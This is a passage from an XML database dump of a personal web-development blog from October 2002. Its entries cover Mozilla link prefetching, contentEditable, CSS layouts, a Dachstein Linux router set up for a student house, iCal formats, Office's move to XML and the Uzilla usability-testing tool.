&lt;p&gt;My second complaint is with this part of the FAQ:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.mozilla.org/projects/netlib/Link_Prefetching_FAQ.html&quot;&gt;
&lt;p&gt;In addition to this restriction, URLs with a query string are not prefetched.  This is done because such URLs often result in documents that cannot be reused out of the browser's cache, so prefetching them often has little benefit.  We found that some existing sites utilize the &amp;lt;link rel=&quot;next&quot;&amp;gt; tag with URLs containing query strings to reference the next document in a series of documents.  Bugzilla is an example of such a site that does this, and it turns out that the Bugzilla bug reports are not cachable, so prefetching these URLs would nearly double the load on poor Bugzilla!  It's easy to imagine other sites being designed like Bugzilla, so we explicitly do not prefetch URLs with query strings.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In these days of URL rewriting and dynamically generated sites this just doesn't make sense - what would happen if the next version of Bugzilla used URL rewriting to have &quot;proper&quot; links to each bug description rather than query strings? In my opinion, a better solution would be to forget about rel=&quot;next&quot; links entirely and instead rely only on rel=&quot;prefetch&quot; elements. That way authors of dynamic sites can enable prefetch if they know it will not be broken by their dynamic pages, while sites like Bugzilla that use a rel=&quot;next&quot; element will not be adversely affected.&lt;/p&gt;</field>
		<field name="created">2002-10-17 13:10:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">495</field>
		<field name="title">I want this book</field>
		<field name="slug">iWantThisBook</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.amazon.co.uk/exec/obidos/ASIN/0596003161&quot;&gt;Dynamic HTML, 2nd edition&lt;/a&gt; is out (via &lt;a href=&quot;http://www.joelonsoftware.com/news/20021009.html&quot;&gt;Joel on Software&lt;/a&gt;). I want it.&lt;/p&gt;</field>
		<field name="created">2002-10-17 13:45:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">496</field>
		<field name="title">Where PR flacks come from?</field>
		<field name="slug">wherePRFlacksComeFrom</field>
		<field name="body">&lt;p&gt;Dorothea Salo &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2002_10_13.html#e001005&quot; title=&quot;Soulless PR flacks&quot;&gt;skillfully explains&lt;/a&gt; her theory of where soulless PR flacks come from.&lt;/p&gt;</field>
		<field name="created">2002-10-17 13:47:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">497</field>
		<field name="title">contentEditable in Mozilla</field>
		<field name="slug">contentEditableInMozilla</field>
		<field name="body">&lt;p&gt;ContentEditable for Mozilla is a hot topic at the moment. The main focus of the debate is &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=97284&quot; title=&quot;Bug 97284: allow page to make arbitrary elements user-editable in browser&quot;&gt;this bug&lt;/a&gt; on Bugzilla, which gets pretty heated. Blogzilla has a good &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/standards_vs_but_ie_does_it.html&quot; title=&quot;Standards vs &amp;quot;But IE Does It&amp;quot;&quot;&gt;explanation&lt;/a&gt; of the principles behind the disagreement, while Scott Andrew makes &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_10#a000443&quot; title=&quot;contentEditable&quot;&gt;an excellent case&lt;/a&gt; for copying IE's implementation:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.scottandrew.com/weblog/2002_10#a000443&quot;&gt;&lt;p&gt;
To my knowledge, no W3 working group is discussing how to implement editable content directly in a Web page, so the question remains: do we follow IE's de facto standard, or wait for a standards body to hammer out one?
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-10-17 13:53:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">498</field>
		<field name="title">50 XSLT tips</field>
		<field name="slug">xsltTips</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.perfectxml.com/TipsXSLT.asp&quot;&gt;50 XSLT Tips&lt;/a&gt;. I particularly like Tip 13, whish shows how you can use a recursive template call to print things out multiple times (for example, 5 asterisks for something with a 5 star rating).&lt;/p&gt;</field>
		<field name="created">2002-10-17 14:04:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">499</field>
		<field name="title">Tricking browsers and hiding styles</field>
		<field name="slug">trickingBrowsersAndHidingStyle</field>
		<field name="body">&lt;p&gt;Eric Meyer on CSS: &lt;a href=&quot;http://www.ericmeyeroncss.com/bonus/trick-hide.html&quot;&gt;Tricking Browsers and Hiding Styles&lt;/a&gt;. This bonus chapter which was not included in the book explains the various techniques that can be used to hide CSS rules from browsers, including the high pass filter and the infamous voice-model hack. Eric has also published &lt;a href=&quot;http://www.ericmeyeroncss.com/bonus/render-mode.html&quot;&gt;Picking a Rendering Mode&lt;/a&gt;, a comprehensive guide to DOCTYPE switching and the effect it has on modern browsers.&lt;/p&gt;</field>
		<field name="created">2002-10-17 14:21:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">500</field>
		<field name="title">Lessons from the Bookmobile</field>
		<field name="slug">lessonsFromTheBookmobile</field>
		<field name="body">&lt;p&gt;I first read about the Internet Bookmobile last week on &lt;a href=&quot;http://www.aaronsw.com/weblog/000650&quot; title=&quot;Mr. Swartz Goes to Washington&quot;&gt;Aaron Swartz' Weblog&lt;/a&gt;. &lt;a href=&quot;http://www.oreillynet.com/pub/a/network/2002/10/18/bookmobile&quot;&gt;Lessons from the Internet Bookmobile&lt;/a&gt; is a new article on the O'Reilly Network by Richard Koman, who spent the week preceeding the opening of the Supreme Court &lt;a href=&quot;http://eldred.cc/&quot;&gt;Eldred vs Ashcroft&lt;/a&gt; case travelling with the bookmobile as it made it's way up from San Francisco to Washington, stopping off at schools and libraries along the way to demonstrate the importance of the public domain. The article discusses the potential effect cheap book printing technology combined with the internet and the public domain could have on schools, libraries and even commercial publishers:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.oreillynet.com/pub/a/network/2002/10/18/bookmobile&quot;&gt;&lt;p&gt;
In fact, the Bookmobile's message, in essence, is that these are books we can put in the hands of children, through schools, and we can do it at a very low cost. (The material cost for a black and white book with color cover is $1.) We can create large-print versions of these books and put them in the hands of senior citizens, and we can deliver them to their homes or to retirement centers. We can transform libraries into public-domain printing plants. And we can enable commercial publishers to create new products that attract new customers, both young and old.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Richard also wrote &lt;a href=&quot;http://www.salon.com/tech/feature/2002/10/09/bookmobile/index.html&quot;&gt;this article&lt;/a&gt; for Salon describing the Bookmobile and how it relates to the Eldred case.&lt;/p&gt;</field>
		<field name="created">2002-10-19 19:41:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">501</field>
		<field name="title">Dictionary of Linux commands</field>
		<field name="slug">dictionaryOfLinuxCommands</field>
		<field name="body">&lt;p&gt;One for the bookmarks: O'Reilly's &lt;a href=&quot;http://www.onlamp.com/linux/cmd/&quot;&gt;Alphabetical Directory of Linux Commands&lt;/a&gt;. 379 commands complete with a description and list of command line options. Found via an advert on the Internet Bookmobile story (and I usually &lt;em&gt;never&lt;/em&gt; click on ads).&lt;/p&gt;</field>
		<field name="created">2002-10-19 19:42:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">502</field>
		<field name="title">Easy routing with Linux</field>
		<field name="slug">easyRoutingWithLinux</field>
		<field name="body">&lt;p&gt;I spent the last few days setting up a home network. I'm living in a student house with 4 other people and we recently shelled out for a 1 Mbit cable connection fron &lt;a href=&quot;http://www.blueyonder.co.uk/&quot;&gt;BlueYonder&lt;/a&gt;. I had never built a network before but neither had anyone else so the task of putting it all together fell on my shoulders.&lt;/p&gt;

&lt;p&gt;I'll get straight to the point. &lt;a href=&quot;http://lrp.steinkuehler.net/DiskImages/Dachstein.htm&quot;&gt;Dachstein&lt;/a&gt; (an offshoot of the &lt;a href=&quot;http://www.linuxrouter.org/&quot;&gt;Linux Router Project&lt;/a&gt;) is sheer magic. Having wired up the whole house through our 8 port switch I realised that BlueYonder only allow you to connect one PC at a time to the cable modem; we needed a router. Dachstein is a linux-router-on-a-disk - all you need is an old PC with a floppy disk drive and a couple of network cards (no hard drive required). You download a windows executable and run it, insert a floppy disk and the software creates a router disk for you. A few configuration steps later (mainly to do with selecting the correct drivers for your network card) and you have a fully functional, ultra secure linux router. Simple - at least, it would have been simple if BlueYonder's system for adding a new Ethernet MAC address to the list of addresses supported by the cable modem actually worked. As it was I ended up having to transplant the network card from my already configured desktop in to the router, but once that was done everything worked a treat.&lt;/p&gt;

&lt;p&gt;My next project is to add an &lt;acronym title=&quot;Secure Shell&quot;&gt;SSH&lt;/acronym&gt; daemon to the router so I can log in and play with it without plugging in a monitor and keyboard. Luckily the &lt;acronym title=&quot;Linux Router Project&quot;&gt;LRP&lt;/acronym&gt; has an &lt;a href=&quot;http://sourceforge.net/docman/?group_id=13751&quot; title=&quot;Linux Embedded Appliance Firewall: Document Manager&quot;&gt;excellent documentation site&lt;/a&gt; which includes a &lt;a href=&quot;http://sourceforge.net/docman/display_doc.php?docid=1441&amp;amp;group_id=13751&quot; title=&quot;How Do I add SSH to the LEAD boot disk?&quot;&gt;step by step guide&lt;/a&gt; to getting SSH running.&lt;/p&gt;</field>
		<field name="created">2002-10-20 13:09:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">503</field>
		<field name="title">CD Zapping</field>
		<field name="slug">cdZapping</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.netcomuk.co.uk/~wwl/cdzap.html&quot;&gt;CD Zapping&lt;/a&gt;: &lt;q cite=&quot;http://www.netcomuk.co.uk/~wwl/cdzap.html&quot;&gt;Take one CD, Microwave at full power for 5 seconds, and place on top of tesla coil. Enjoy!&lt;/q&gt;&lt;/p&gt;</field>
		<field name="created">2002-10-20 13:10:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">504</field>
		<field name="title">Generating HTML with XQuery</field>
		<field name="slug">xQuery</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.gnu.org/software/qexo/XQ-Gen-XML.html&quot;&gt;Generating XML and HTML using XQuery&lt;/a&gt; (via &lt;a href=&quot;http://www.whump.com/moreLikeThis/link/03114&quot; title=&quot;Generating XHTML using XQuery&quot;&gt;More Like This&lt;/a&gt;). I had been confusing XQuery with XPath - it turns out XQuery is a fully featured scripting language which can be used to do all kinds of things with data from XML documents. The article explains how XQuery can be used to build a web photo gallery application and compares XSLT and XQuery using a Docbook transformation example.&lt;/p&gt;</field>
		<field name="created">2002-10-20 13:57:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">505</field>
		<field name="title">Terminal Services vs WinVNC</field>
		<field name="slug">terminalServicesVsVNC</field>
		<field name="body">&lt;p&gt;Joel Spolsky &lt;a href=&quot;http://www.joelonsoftware.com/news/20021019.html&quot; title=&quot;VNC vs. Windows Terminal Services&quot;&gt;explains&lt;/a&gt; why Microsoft's Terminal Services performs far better than the open source WinVNC. Stuart &lt;a href=&quot;http://www.kryogenix.org/days/000333.cas&quot; title=&quot;Terminal Services vs. VNC&quot;&gt;points out&lt;/a&gt; that simple economics can make &lt;acronym title=&quot;Virtual Network Computing&quot;&gt;VNC&lt;/acronym&gt; a far more viable option in many situations.&lt;/p&gt;</field>
		<field name="created">2002-10-20 14:03:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">506</field>
		<field name="title">Useful LRP links</field>
		<field name="slug">usefulLRPLinks</field>
		<field name="body">&lt;p&gt;Some useful Linux Router Project links:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.linuxrouter.org/&quot;&gt;The Linux Router Project Homepage&lt;/a&gt; - virtually unmaintained and very out of date.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://sourceforge.net/projects/leaf/&quot;&gt;LEAF on Sourceforge&lt;/a&gt; - the home of various LRP packages.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://sourceforge.net/docman/?group_id=13751&quot;&gt;Linux Embedded Appliance Firewall: Document Manager&lt;/a&gt; - a gold mine of useful LRP related documentation.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;ftp://sunsite.unc.edu/pub/Linux/distributions/linux-router/dists/current/packages&quot;&gt;Linux Router Packages via FTP&lt;/a&gt; - mirrored on sunsite, a collection of useful LRP packages.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.linuxrouter.org/mailman/listinfo/linux-router&quot;&gt;The LRP Mailing List&lt;/a&gt; - subscription and Mailman info page.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.linuxrouter.org/listarch/linux-router/&quot;&gt;The Linux Router Project Mailing List Archives&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lrp.steinkuehler.net/&quot;&gt;Charles Steinkuehler's LEAF/LRP Website&lt;/a&gt; - home of Dachstein, Eiger and several other LRP disk images.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.dreamwvr.com/lrp2-info/lrp2-faq.html&quot; title=&quot;LRP2 FAQ - Frequently asked questions Linux Router Project 2 - Materhorn&quot;&gt;Materhorn FAQ&lt;/a&gt; - a pretty detailed FAQ covering Materhorn, a floppy disk LRP pinoff. I'm not sure how up to date this document is.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://chinese-watercolor.com/LRP/hd/lrpfile.html&quot;&gt;Some LRP modules&lt;/a&gt;, including SSH, Bind and other useful utilities.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-10-20 14:20:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">507</field>
		<field name="title">Advanced PHP resources</field>
		<field name="slug">advancedPHPResources</field>
		<field name="body">&lt;p&gt;HarryF on the SitePoint forums has compiled a fantastic list of &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=78687&quot;&gt;Advanced PHP Resources&lt;/a&gt;, with links to sites covering object orientation, general application design, n-tier layering and using PHP with XML.&lt;/p&gt;</field>
		<field name="created">2002-10-20 14:45:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">508</field>
		<field name="title">More CSS layouts</field>
		<field name="slug">moreCssLayouts</field>
		<field name="body">&lt;p&gt;I'm not sure when it happened, but &lt;a href=&quot;http://www.opera.com/&quot;&gt;Opera.com&lt;/a&gt; has been redesigned (since the last time I checked the site). The new layout is done with valid XHTML and CSS but is decidedly tabular in appearance, demonstrating that using CSS does not (as some people have claimed) make it impossible to achieve the same kinds of layouts as table coders have been creating for years. It also degrades quite nicely in Netscape 4 (losing most of the layout but maintaining a crisp look and feel). In related news, Jeffrey Zeldman is currently redesigning &lt;a href=&quot;http://www.zeldman.com/&quot;&gt;The Daily Report&lt;/a&gt; with CSS (replacing his old transitional tables/CSS layout). No menu yet, but it displays in Netscape 4 almost exactly the same as Mozilla and IE.&lt;/p&gt; </field>
		<field name="created">2002-10-21 11:00:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">509</field>
		<field name="title">Opera small screen rendering</field>
		<field name="slug">operaSmallScreenRendering</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.opera.com/products/smartphone/smallscreen/&quot;&gt;Opera Small-Screen Rendering&lt;/a&gt; (via &lt;a href=&quot;http://randomfoo.net/?p=2002_10_13_archive.inc#85574274&quot; title=&quot;Random Foo: 10/17/2002 04:19:43 PM&quot;&gt;Leonard&lt;/a&gt;):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.opera.com/products/smartphone/smallscreen/&quot;&gt;&lt;p&gt;
Content reformatting - Instead of presenting table content in columns and rows, tables are reformatted into a one-dimensional structure that better fits smaller screens. Opera can selectively scale down large images or remove those that are superfluous, as well as some other tricks that make the pages fit small screens. And as a result, the user has no need for a horizontal scrollbar.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;See also &lt;a href=&quot;http://news.com.com/2100-1023-961831.html&quot; title=&quot;Opera phone browser could upstage rivals&quot;&gt;this C-Net article&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-10-21 12:25:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">510</field>
		<field name="title">Qube</field>
		<field name="slug">qube</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://wouter.fov120.com/cube/index.php4&quot;&gt;Qube&lt;/a&gt; looks pretty cool - it's an open source first person shooter engine (and simple deathmatch game) designed specifically for mod developers. The client runs on both Windows and Linux, but the game server is Linux/BSD only. Spotted via &lt;a href=&quot;http://linux.oreillynet.com/pub/a/linux/2002/10/10/cube3d.html&quot; title=&quot;Free Frags with Cube: The Linux First-Person Shooter&quot;&gt;this article&lt;/a&gt; on the O'Reilly network.&lt;/p&gt;</field>
		<field name="created">2002-10-21 13:59:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">511</field>
		<field name="title">Validation on the fly</field>
		<field name="slug">validationOnTheFly</field>
		<field name="body">&lt;p&gt;Douglas Bowman's &lt;a href=&quot;http://www.stopdesign.com/&quot; title=&quot;[stop]design&quot;&gt;weblog&lt;/a&gt; is making very interesting reading at the moment. Douglas is responsible for &lt;a href=&quot;http://www.wired.com/&quot;&gt;Wired's&lt;/a&gt; exciting new design and since the launch has been updating with observations and lessons learnt from the new look. On Friday he &lt;a href=&quot;http://www.stopdesign.com/log.asp?date=20021018&quot; title=&quot;One Change, Immediate Results&quot;&gt;described&lt;/a&gt; how changing a problem with a design element took less than 60 seconds (thanks to global CSS files), but the post that caught my attention was &lt;a href=&quot;http://www.stopdesign.com/log.asp?date=20021017&quot; title=&quot;Futureproofing Amps&quot;&gt;this one&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
However, daily editorial additions continue to allow XHTML validation errors to sneak into the Wired News markup. The most frequent culprits are the ampersands (&amp;amp;) which separate name/value pairs in URL query strings, or which commonly appear in our English language in company names like AT&amp;amp;T or slang acronyms like R&amp;amp;D.&lt;/p&gt;

&lt;p&gt;[snip]&lt;/p&gt;

&lt;p&gt;Somehow, we have to avoid the constant manual check of pages and retroactive fixes of existing errors. This method is unreliable and time consuming. I'm sure the engineers will be making modifications to our content insertion tool, so that validation errors like naked ampersands can be automatically detected and corrected as they're entered.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I had the exact same problem with this blog. My solution was to throw every entry through &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;a href=&quot;http://www.php.net/manual/en/ref.xml.php&quot; title=&quot;XML parser functions&quot;&gt;XML parser&lt;/a&gt; when it is added - if the XML parser throws an error a warning message is displayed to encourage me to validate the page and re-check the entry. I imagine Wired's content management system requires a slightly more elaborate solution than that but for my small scale needs it has been working a treat.&lt;/p&gt;</field>
		<field name="created">2002-10-21 20:15:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">512</field>
		<field name="title">Blogrolled</field>
		<field name="slug">blogrolled</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/10/21/1226#comments&quot; title=&quot;While I was gone...&quot;&gt;Adrian Holovaty&lt;/a&gt; I discover Craig Saila &lt;a href=&quot;http://www.saila.com/columns/lcky/&quot; title=&quot;Living Can Kill You&quot;&gt;has an excellent weblog&lt;/a&gt;, and is now pinging &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; whenever he updates. A welcome addition to my blogroll.&lt;/p&gt;</field>
		<field name="created">2002-10-21 20:30:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">513</field>
		<field name="title">Scary</field>
		<field name="slug">scary</field>
		<field name="body">&lt;p&gt;Dan Gillmor: &lt;a href=&quot;http://www.siliconvalley.com/mld/siliconvalley/business/columnists/dan_gillmor/ejournal/4307752.htm&quot;&gt;Microsoft Piggy Bank Tops $40 Billion&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.siliconvalley.com/mld/siliconvalley/business/columnists/dan_gillmor/ejournal/4307752.htm&quot;&gt;&lt;p&gt;
What is Microsoft going to do with this money? They can't spend it fast enough internally, and the top shareholders, who control the company, refuse to issue dividends (this saves Bill Gates et al billions in taxes). Prediction: Once Microsoft is out from under what's left of the antitrust case, it'll go on a strategic investment and acquisition spree the likes of which you cannot even imagine.
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Scary&lt;/em&gt;.&lt;/p&gt;</field>
		<field name="created">2002-10-21 20:50:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">514</field>
		<field name="title">RSS validator</field>
		<field name="slug">rssValidator</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://feeds.archive.org/validator/check.cgi?url=http://simon.incutio.com/syndicate/rss1.0&quot;&gt;RSS Validator&lt;/a&gt;. My RSS feed &lt;a href=&quot;http://feeds.archive.org/validator/&quot; title=&quot;RSS Validator Results&quot;&gt;validates&lt;/a&gt; - does yours?&lt;/p&gt;</field>
		<field name="created">2002-10-22 10:23:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">515</field>
		<field name="title">Mozilla small screen rendering</field>
		<field name="slug">mozillaSmallScreenRendering</field>
		<field name="body">&lt;p&gt;Yesterday I &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/21/#operaSmallScreenRendering&quot;&gt;blogged&lt;/a&gt; Opera's impressive looking &lt;a href=&quot;http://www.opera.com/products/smartphone/smallscreen/&quot; title=&quot;Opera Small Screen Rendering&quot;&gt;small screen rendering&lt;/a&gt; technology. Now &lt;a href=&quot;http://daniel.glazman.free.fr/weblog/archived/2002_10_20_glazblogarc.html#83291371&quot; title=&quot;glazblog: Small Screen Rendering&quot;&gt;take a look at this&lt;/a&gt; (via &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/small_screen_rendering_in_mozilla.html&quot; title=&quot;Small Screen Rendering in Mozilla&quot;&gt;Blogzilla&lt;/a&gt;). Daniel Glazman has created a Mozilla bookmarklet that does everything Opera's implementation claims to achieve using a combination of a custom style sheet and the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;, and the results are impressively similar to Opera's &lt;a href=&quot;http://www.opera.com/products/smartphone/smallscreen/nokia/&quot; title=&quot;Opera Small Screen Rendering: www.nokia.com&quot;&gt;demonstration&lt;/a&gt;. The difference?&lt;/p&gt;

&lt;blockquote cite=&quot;http://daniel.glazman.free.fr/weblog/archived/2002_10_20_glazblogarc.html#83291371&quot;&gt;&lt;p&gt;
Well, there is one difference between what Opera does and what Mozilla could do. We could do it much better.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-10-22 10:49:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">516</field>
		<field name="title">Lots of iCal links</field>
		<field name="slug">lotsOfICalLinks</field>
		<field name="body">&lt;p&gt;I'm writing a simple events calendar system at the moment, and since I always seem to end up making things more complicated than they should actually be I've been investigating using the iCal standard as the file format for storing events (I need a flat-file format due to hosting requirements). I'm particularly interested in the XML flavour of iCal, although it seems to be a lot less popular than the semicolon deliminated original standard. Mainly for my own reference, here are the sites I've trawled through this afternoon:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ietf.org/rfc/rfc2445.txt&quot;&gt;iCal RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.globecom.net/ietf/draft/draft-reddy-xml-ical-00.html&quot;&gt;iCal in XML&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://xml.coverpages.org/iCal-DTD-20011103.txt&quot;&gt;iCal XML DTD&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ietf.org/internet-drafts/draft-ietf-calsch-many-xcal-02.txt&quot;&gt;iCal DTD explained&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mozilla.org/projects/calendar/&quot;&gt;Mozilla Calendar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.innerjoin.org/iCalendar/&quot;&gt;Notes on Mozilla and iCalendar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://developer.iplanet.com/docs/wpapers/calendar/standard.html&quot;&gt;iCal Format Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/NOTE-datetime&quot;&gt;W3C Note: Date and Time Formats&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/2001/sw/Europe/200210/calendar/vocab_usecases.html&quot;&gt;Semantic Web Calendaring vocabularies and usecases&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/2001/sw/Europe/200210/calendar/vocab_usecases.html#xcal&quot;&gt;Explanation of the mapping from iCalendar to XML DTD&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cse.ucsc.edu/~marick/iCalendarUML.html&quot;&gt;iCal in UML&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-10-22 15:08:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">517</field>
		<field name="title">CSS short hand</field>
		<field name="slug">cssShortHand</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://home.no.net/junjun/html/shorthand.html&quot;&gt;Introduction to CSS shorthand properties&lt;/a&gt; (via &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000673.php&quot; title=&quot;CSS { short: hand; }&quot;&gt;webgraphics&lt;/a&gt;, via &lt;a href=&quot;http://www.glish.com/archive.asp?file=2002_10_20_archive.xml#83379887&quot; title=&quot;Tuesday, October 22, 2002&quot;&gt;Glish&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-10-23 10:56:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">518</field>
		<field name="title">The Web Style Guide</field>
		<field name="slug">theWebStyleGuide</field>
		<field name="body">&lt;p&gt;Spotted in Ordinary Life's &lt;a href=&quot;http://www.ordinary-life.net/directory/new.php?switch=newview&amp;amp;timestamp=1035259200&quot;&gt;new bookmarks&lt;/a&gt;, the &lt;a href=&quot;http://www.webstyleguide.com/&quot;&gt;Web Style Guide&lt;/a&gt; is a full online book covering all kinds of different aspects of web design. I've only glanced through it so far but it appears to have some excellent material on the design process, typography and editorial style. There is a good focus on usability and accessibility but web standards don't really get much coverage, and CSS for layout is discouraged in favour of tables for reasons of browser support.&lt;/p&gt;</field>
		<field name="created">2002-10-23 11:07:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">519</field>
		<field name="title">Office goes XML</field>
		<field name="slug">officeXml</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.sys-con.com/xml/articlenews.cfm?id=513&quot;&gt;Co-Inventor of XML Says Office 11 is &quot;A Huge Step Forward for Microsoft&quot;&lt;/a&gt; (via &lt;a href=&quot;http://slashdot.org/articles/02/10/24/032243.shtml&quot; title=&quot;Tim Bray on Microsoft Office&quot;&gt;Slashdot&lt;/a&gt;). The comments are full of speculation over why Microsoft would open up their file format in this way having gained so much from having an obfuscated format.&lt;/p&gt;

&lt;p&gt;I've got my own theory. I don't use Word very often, but when I do I use Word '97 - the same version of Word I've been using on and off for the past 5 years. My girlfriend uses '97, the PCs in the Library at University use '97 and I'm guessing it has a pretty large penetration. Why? Because as far as I can tell Word really hasn't improved that much since then. Word '97 has all the features most people could possibly want from a word processor, leaving very little incentive to upgrade.&lt;/p&gt;

&lt;p&gt;Enter XML. With the XMLisation of the Word format Microsoft has suddenly provided people with a real incentive to move away from older versions of Word - XML is (still) the ultimate buzzword and IT departments and those who make the buying decisions for big companies are likely to instantly spot the benefits of the new format: Better (potential) interoperability and less lock-in to MS products. Meanwhile, Microsoft can concentrate on &lt;a href=&quot;http://slashdot.org/comments.pl?sid=43142&amp;amp;cid=4520243&quot;&gt;locking up the filesystem&lt;/a&gt; instead.&lt;/p&gt;</field>
		<field name="created">2002-10-24 13:45:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">520</field>
		<field name="title">Uzilla</field>
		<field name="slug">uzilla</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://uzilla.net/uzilla/info/&quot;&gt;Uzilla&lt;/a&gt; (via &lt;a href=&quot;http://surfmind.com/musings/2002/10/15.cfm#a339&quot; title=&quot;Uzilla.net 1.0&quot;&gt;SurfMind&lt;/a&gt;) is a commercial product built on top of Mozilla:&lt;/p&gt;

&lt;blockquote cite=&quot;http://uzilla.net/uzilla/info/&quot;&gt;&lt;p&gt;
The Uzilla suite is a set of tools for web based usability testing. It decreases the time and effort required set up and do usability testing while increasing the accuracy and power of the data collected during testing. Uzilla makes the job easier for both usability practioners and webmasters.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I've been learning about usability testing as part of a User Interface course at Uni. One of the principle methods of usability evaluation is to observe users as they work through a set of tasks. Uzilla consists of a web application for designing the usability test (survey questions, task lists), a modified version of Mozilla which displays tasks to the user and tracks everything they do within the browser and a set of tools to help analyse the user's behaviour. Details on the visualisation part of things are sketchy at the moment but it looks like SVG is used to visualise the user's individual mouse movements (lots of pretty lines and coloured dots at any rate).&lt;/p&gt;

&lt;p&gt;Uzilla costs a fair whack ($2350 for a 3 test commercial license, discounts for non-profits and academic use) but looks more than worth it for large companies. The software was developed (at least in part) by Andy Edmonds, the guy behind Mozilla's excellent &lt;a href=&quot;http://optimoz.mozdev.org/&quot;&gt;Mouse Gestures&lt;/a&gt; add-on.&lt;/p&gt;</field>
